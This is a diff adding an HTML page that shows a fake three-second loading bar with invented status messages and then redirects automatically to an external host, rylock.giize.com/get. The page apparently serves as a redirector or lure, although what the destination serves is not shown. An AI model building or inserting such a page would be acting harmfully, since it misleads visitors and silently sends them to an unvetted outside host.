@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading...</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: white;
+      border-radius: 16px;
+      padding: 40px 30px;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    h1 {
+      color: #333;
+      margin-bottom: 25px;
+      font-size: 1.5rem;
+    }
+
+    .progress-wrapper {
+      background: #e0e0e0;
+      border-radius: 10px;
+      height: 24px;
+      overflow: hidden;
+      margin: 20px 0;
+      position: relative;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #667eea, #764ba2);
+      border-radius: 10px;
+      transition: width 0.1s linear;
+      position: relative;
+    }
+
+    .progress-text {
+      color: #555;
+      font-weight: 600;
+      font-size: 1.1rem;
+      margin-top: 10px;
+    }
+
+    .status {
+      color: #777;
+      font-size: 0.95rem;
+      margin-top: 15px;
+      min-height: 20px;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 480px) {
+      .container {
+        padding: 30px 20px;
+      }
+      
+      h1 {
+        font-size: 1.3rem;
+      }
+      
+      .progress-wrapper {
+        height: 20px;
+      }
+      
+      .progress-text {
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Preparing your destination...</h1>
+    
+    <div class="progress-wrapper">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    
+    <div class="progress-text" id="progressText">0%</div>
+    <div class="status" id="status">Loading, please wait...</div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const progressBar = document.getElementById('progressBar');
+      const progressText = document.getElementById('progressText');
+      const status = document.getElementById('status');
+      
+      const duration = 3000; // 3 seconds
+      const interval = 16; // ~60fps
+      const steps = duration / interval;
+      let currentStep = 0;
+      
+      const timer = setInterval(() => {
+        currentStep++;
+        const percent = Math.min(100, Math.round((currentStep / steps) * 100));
+        
+        // Update UI
+        progressBar.style.width = percent + '%';
+        progressText.textContent = percent + '%';
+        
+        // Update status message
+        if (percent < 30) {
+          status.textContent = 'Initializing connection...';
+        } else if (percent < 70) {
+          status.textContent = 'Loading resources...';
+        } else if (percent < 100) {
+          status.textContent = 'Finalizing...';
+        }
+        
+        // Redirect when complete
+        if (percent >= 100) {
+          clearInterval(timer);
+          status.textContent = 'Redirecting...';
+          
+          // Small delay for visual feedback before redirect
+          setTimeout(() => {
+            window.location.href = 'https://rylock.giize.com/get';
+          }, 300);
+        }
+      }, interval);
+    });
+  </script>
+</body>
+</html>
